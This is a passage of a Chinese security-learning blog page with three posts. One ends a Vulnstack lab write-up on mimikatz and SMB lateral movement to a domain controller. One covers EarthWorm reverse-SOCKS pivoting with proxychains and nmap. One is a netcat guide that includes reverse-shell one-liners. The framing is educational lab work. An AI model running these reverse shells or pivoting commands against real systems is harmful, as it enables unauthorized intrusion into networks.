<p>既然存在445端口，那么可以用run minikatz模块进行横向（虽然早就拿到账号密码了</p>
<p>抓到密码之后创建一个smb，然后对目标主机进行横向</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160610417.png" alt="image-20220823160610417"></p>
<p>dc主机成功上线！</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823160753720.png" alt="image-20220823160753720"></p>
<p>在那边pc也是没有过免杀的（360弹窗了，麻了，后面再学免杀把。</p>
<p>随后也是成功上线pc</p>
<p><img src="/wan1/wan1/2022/08/23/vulnstack-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%BA%8C/image-20220823162540948.png" alt="image-20220823162540948"></p>
<p>拿下靶场！</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/121229030">(96条消息) psexec的底层实现原理是什么_Ping_Pig的博客-CSDN博客_psexec原理</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/wan1/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">Earthworm+ProxyChains实现socks代理渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-22 20:26:28 / 修改时间：20:28:10" itemprop="dateCreated datePublished" datetime="2022-08-22T20:26:28+08:00">2022-08-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/wan1/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Earthworm-ProxyChains实现socks代理渗透"><a href="#Earthworm-ProxyChains实现socks代理渗透" class="headerlink" title="Earthworm+ProxyChains实现socks代理渗透"></a>Earthworm+ProxyChains实现socks代理渗透</h1><p>ProxyChains是Linux下的代理工具，kali已经安装，它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p>
<p>EW是一套便携式的网络穿透工具，具有SOCKS5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，而且适用于不同的操作系统。</p>
<h2 id="反弹socks5服务器"><a href="#反弹socks5服务器" class="headerlink" title="反弹socks5服务器"></a>反弹socks5服务器</h2><p>1）在kali上</p>
<p>在kali上运行：</p>
<p>./ew_linux_x64 -s rcsocks -l 1080 -e 1234</p>
<p>该命令的意思是在kali上添加一个转接隧道，把本地1080端口收到的代理请求转交给1234端口。</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/504b028c-f85b-4634-97dd-e4949d0d91a2202206173c3ea39f-2236-4098-a6ac-63c39fb13c281.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>2）在web服务器上</p>
<p>我们刚才在win10已经使用xshell远程连接web服务器，运行：</p>
<p>./ew_linux_x64 -s rssocks -d 192.168.1.109 -e 1234</p>
<p>该命令的意思是在web服务器上启动SOCKS5服务，并反弹到IP地址为192.168.1.109（kali）的1234端口上。</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/1d160ac4-6ea8-4ded-815f-16bd3f95d36920220617a26f10dd-f213-45af-8164-b2e68b4489301.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>3）配置proxychains.conf</p>
<p>现在就可以通过访问127.0.0.1:1080端口使用在右侧web服务器上架设的SOCKS5代理服务了。</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/f0fdc529-6f6a-4b3e-a39c-69c7939461d8202206178ef83bd2-3936-4719-a629-82447cc2e5391.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>/etc/proxychains.conf修改内容如下，去掉dynamic_chain的注释，并且在最后的位置添加代理。</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/fb45d930-ad61-40a9-8163-4393bfc2427720220617dc916179-b43d-44d7-a4bd-62e79e63c7b21.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/ec08eec2-a9d1-41b0-80ac-18a6128c309820220617b4192fa9-db6c-4ba1-81e5-efa9b55777e11.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>4）测试代理服务器是否正常</p>
<p>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</p>
<p>proxyresolv 192.168.223.166</p>
<p>发现代理正常，现在我们已经可以访问192.168.223.166了。</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/104ff069-a78c-42a7-9282-ef4e50a9e0f42022061708740834-ba9b-4622-b07a-caaa3681039c1.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>用proxychains可以启动任何程序，proxychains配合nmap和msf是内网渗透的大杀器，需要注意的是proxychains不支持udp和icmp协议。现在启动nmap，使用TCP扫描，不使用ping扫描，扫描整个内网，我们发现只能访问下面这台机器，对它进行扫描：</p>
<p><img src="/wan1/wan1/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/7d82c81e-0120-4aba-b41d-6989a122f2a5202206177a2f44ca-37b3-46c5-bc10-27a39ce737241.jpg" alt="通过SOCKS代理渗透整个内网"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/wan1/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/wan1/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">nc工具安装与使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-22 19:01:04 / 修改时间：19:03:08" itemprop="dateCreated datePublished" datetime="2022-08-22T19:01:04+08:00">2022-08-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/wan1/categories/tools/" itemprop="url" rel="index"><span itemprop="name">-tools</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="nc工具安装与使用"><a href="#nc工具安装与使用" class="headerlink" title="nc工具安装与使用"></a>nc工具安装与使用</h1><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<p>下载下来就好</p>
<p>打开命令界面 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a></p>
<p>输入nc命令即可</p>
<p>我是在测试sparkStreaming时候用到</p>
<p>输入 nc -L -p 9999 </p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p><code>yum -y install nc</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>常用的一些命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-4 IPv4模式</span><br><span class="line">-6 IPv6模式</span><br><span class="line">-b, --bluetooth 蓝牙模式 (默认为L2CAP协议)</span><br><span class="line">-e,--exec=CMD 连接建立后执行命令</span><br><span class="line">-l 监听入站连接</span><br><span class="line">-n 指定数字的IP地址，不能用hostname</span><br><span class="line"></span><br><span class="line">-u UDP模式</span><br><span class="line">-t TCP模式（默认模式）</span><br><span class="line"></span><br><span class="line">-v 详细输出——用两个-v可得到更详细的内容</span><br><span class="line">-w，--time=SECONDS 连接建立后的延时</span><br><span class="line">-z 扫描模式，不会发送任何数据</span><br><span class="line">-T，--ttl=TTL 自定义初始TTL</span><br><span class="line">-z 将输入输出关掉——用于扫描时</span><br><span class="line">-x，--transfer 文件传输模式</span><br><span class="line">-X ，--rev-transfer 反向文件传输模式</span><br><span class="line">-s，--address=ADDRESS 本地源ip</span><br></pre></td></tr></table></figure>

<h2 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h2><ul>
<li><p>1 . 端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -z -v -n 172.31.100.7 21-25</span><br></pre></td></tr></table></figure></li>
<li><p>2 . 交互数据传输</p>
<p>发送端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 172.31.100.7 4444</span><br></pre></td></tr></table></figure>

<p>接收端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></li>
<li><p>3 . 文件传输</p>
<p>发送端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444 &lt; file.txt</span><br></pre></td></tr></table></figure>

<p>接收端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n 172.31.100.7 &gt; file.txt</span><br></pre></td></tr></table></figure></li>
<li><p>4 . 反弹shell（不会被防火墙拦截）</p>
<p>发送端(linux)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.110.20 4445 -e /bin/bash   </span><br></pre></td></tr></table></figure>

<p>（windows）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e cmd 192.168.110.20 4445 </span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></li>
<li><p>5.端口转发</p>
<p>本地端口转发，将<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>的8888端口转发到22端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 8888 -c &quot;nc 127.0.0.1 22&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/wan1/wan1/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/c001fa0a9ba41c99f2785e7cbb821b41.jpeg" alt="c001fa0a9ba41c99f2785e7cbb821b41.jpeg"></p>
<p>​    远程端口转发，访问kali的7777端口，就是访问centos的22端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 7777 -c &quot;nc 192.168.199.236 22&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/wan1/wan1/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/0bee3204916dd3b027b3d0e5b2f921ce.jpeg" alt="0bee3204916dd3b027b3d0e5b2f921ce.jpeg"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/wan1/page/35/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/wan1/">1</a><span class="space">&hellip;</span><a class="page-number" href="/wan1/page/35/">35</a><span class="page-number current">36</span><a class="page-number" href="/wan1/page/37/">37</a><span class="space">&hellip;</span><a class="page-number" href="/wan1/page/58/">58</a><a class="extend next" rel="next" href="/wan1/page/37/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="十三"
      src="/wan1/images/avatar.gif">
  <p class="site-author-name" itemprop="name">十三</p>
  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/wan1/archives/">
        
          <span class="site-state-item-count">172</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">十三</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/wan1/lib/anime.min.js"></script>
  <script src="/wan1/lib/velocity/velocity.min.js"></script>
  <script src="/wan1/lib/velocity/velocity.ui.min.js"></script>

<script src="/wan1/js/utils.js"></script>

<script src="/wan1/js/motion.js"></script>


<script src="/wan1/js/schemes/pisces.js"></script>


<script src="/wan1/js/next-boot.js"></script>




  




  
<script src="/wan1/js/local-search.js"></script>













  

  

<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
